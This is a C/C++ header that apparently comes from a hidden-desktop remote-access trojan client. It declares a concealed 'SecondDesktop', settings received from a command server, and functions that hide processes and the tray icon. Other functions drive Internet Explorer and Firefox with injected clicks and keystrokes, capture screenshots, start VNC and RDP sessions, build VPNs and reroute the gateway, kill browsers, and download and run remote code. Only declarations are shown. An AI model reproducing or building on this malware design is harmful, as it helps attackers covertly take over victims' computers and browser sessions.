#pragma once


//=============================================
#define SECOND_DESK_NAMEW		L"SecondDesktop"
#define SECOND_DESK_NAMEA		"SecondDesktop"

#ifdef UNICODE
#define SECOND_DESK_NAME  SECOND_DESK_NAMEW
#else
#define SECOND_DESK_NAME  SECOND_DESK_NAMEA
#endif // !UNICODE

#define DESKTOP_1 1
#define DESKTOP_2 2
//static int CurDesk;
enum Desktops {First, Second};
Desktops GetCurDesk();
void SetCurDesk(Desktops desk);
//=============================================


// TODO: make most of the functions as members ot this class
class CFileLoader;
class CClientContext
{
public:

	// etc
	ULONG m_dwGdiplusToken;
	CFileLoader *m_pLoader;
	bool m_bUseJpeg;
	bool m_bBoostHideFlag;
	bool m_bJavaMove;
	bool m_bShowAllWindows;
	bool m_bHideSecDesc;

	// startup params
	char m_sServer[1024];
	int m_iPort;
	char m_sUid[1024];
	int m_iBrowserType;

	// options from server
	int m_iSleep1;
	int m_iSleep2;
	int m_iSleep3;
	int m_iSleep;
	int m_iPrio1;
	WCHAR ProccessName[25];
	WCHAR WinHederName[25];
	WCHAR ClassName[50];
	//
	

public:
	CClientContext();
	
};


struct SendParams
{
	DWORD timestamp;
	SOCKET socket;
	SendParams(SOCKET S, DWORD T)
	{
		socket = S;
		timestamp = T;
	}
};

HHOOK getHookN();
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam);

DWORD RemoveRemoteDefaultGateway(WCHAR* ConnectionName);
void CopyDll(bool bYes, WCHAR *str);
void VPNStartThread(SendParams params);
DWORD VPNStop();
DWORD CheckVPNState(DWORD* result);
DWORD CreateVPN(WCHAR* ip);
//bool CreateVPNDialog(WCHAR*ip);

bool RunIE( CClientContext *pContext, TCHAR* cInput,TCHAR* cExe, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE);
bool RunFF( CClientContext *pContext, TCHAR* cInput,TCHAR* cExe, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE);
void StartHidingProcess( CClientContext *pContext, DWORD dwProcessId );
bool WindowKeysToControl( DWORD_PTR id, DWORD_PTR idControl, int x, int y, TCHAR *s, bool bAddEnter, bool bCtrlA,bool bSendM );
bool WindowClicToControl( DWORD_PTR id, DWORD_PTR idControl, int x, int y,bool Left );

bool ClickedControl(HWND hWnd,int x,int y,bool bDBClic, SOCKET s, DWORD timestamp,bool bJavaMov);
BYTE * CaptureWindow( HWND hWndSrc,BYTE **lpBits5,DWORD* Size24);
bool CreateScreenshotBMP( HWND hw, BYTE **data, DWORD *size, int iSleep,BOOL isDelFile,bool MoveWind,bool HiseSecDesc);
bool ConvertToJPEG( BYTE **data, DWORD *size, BYTE *dataBMP, DWORD sizeBMP );
bool DesktopClick( int x, int y, bool bDouble );
bool WindowClick( DWORD_PTR id, int x, int y );
bool DesktopKeys( int x, int y, TCHAR *s, bool bAddEnter, bool bCtrlA );
bool WindowKeys( DWORD_PTR id, int x, int y, TCHAR *s, bool bAddEnter, bool bCtrlA,bool bIsSend );
void SendToMouseClick(HWND hwnd, WORD x, WORD y,WCHAR *cText, bool bLeft, bool bENTER,bool bIsSend);

bool GetOSVersion( OSVERSIONINFOEX *result );
void KillJava();
void GetJavaVersion( WCHAR *buffer, int buffer_size );
void DbgMsgW(WCHAR *file, int line, WCHAR *msg, ...);

bool HideSystemTrayIcon();
bool ShowSystemTrayIcon();

bool KillProcByPid(DWORD pid);
void KillIE_FF_OP(SOCKET s, DWORD timestamp);

void SendMess(WCHAR* msg, SOCKET s, DWORD timestamp);
DWORD DesktopClickWrapper(LPVOID param);

void VPNManualeThread(WCHAR*Ip);
DWORD CreateVPNDialog(LPVOID send_params);

DWORD StartVNC(LPBYTE param);
DWORD WINAPI ClientStartRDP_Dll1( LPVOID lpThreadParameter );

bool DownloadAndRUN(char *DownloadF);